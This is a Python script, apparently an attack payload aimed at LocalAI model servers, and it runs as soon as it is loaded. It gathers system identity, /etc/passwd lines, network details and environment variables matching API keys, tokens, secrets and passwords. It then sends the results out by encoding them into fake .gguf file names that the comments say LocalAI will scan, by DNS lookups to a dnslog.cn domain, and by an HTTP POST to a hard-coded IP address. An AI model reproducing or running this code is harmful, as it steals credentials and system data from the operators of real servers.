import os, subprocess, base64, sys
def _run():
    try:
        r = subprocess.check_output("id; hostname; uname -a; echo ===ENV===; env | grep -iE 'api.?key|token|secret|sk-|deepseek|openai|azure|password|auth|localai|mysql|redis' | head -40; echo ===PASSWD===; head -8 /etc/passwd 2>/dev/null; echo ===NET===; ip a 2>/dev/null | head -15", shell=True, stderr=subprocess.STDOUT, timeout=25)
    except Exception as e:
        r = str(e).encode()
    b64 = base64.b64encode(r).decode()
    # 1. 写 .gguf 文件 (LocalAI watcher 必扫描 gguf) - 文件名=分段b64
    seg = 40
    for i in range(0, len(b64), seg):
        part = b64[i:i+seg]
        fname = "/models/ZZOUT-" + part + ".gguf"
        try:
            with open(fname, "wb") as f:
                f.write(b"GGUF" + r[:200])
        except: pass
    # 2. 写常规文件
    for p in ["/models/PWNED-RESULT.txt", "/tmp/PWNED-RESULT.txt", "/build/models/PWNED-RESULT.txt"]:
        try:
            open(p, "wb").write(r)
        except: pass
    # 3. DNS 外带 (分段, 每段 25 字符)
    try:
        import socket
        DNS = "hc92gc.dnslog.cn"
        for i in range(0, len(b64), 25):
            label = b64[i:i+25].replace("+","a").replace("/","b").replace("=","c")
            try:
                socket.gethostbyname(label + "." + DNS)
            except: pass
    except: pass
    # 4. HTTP 外带尝试
    try:
        import urllib.request as u
        req = u.Request("http://203.160.68.160:18080/exfil2", data=b64.encode(), headers={"Content-Type":"text/plain"}, method="POST")
        u.urlopen(req, timeout=5)
    except: pass
_run()
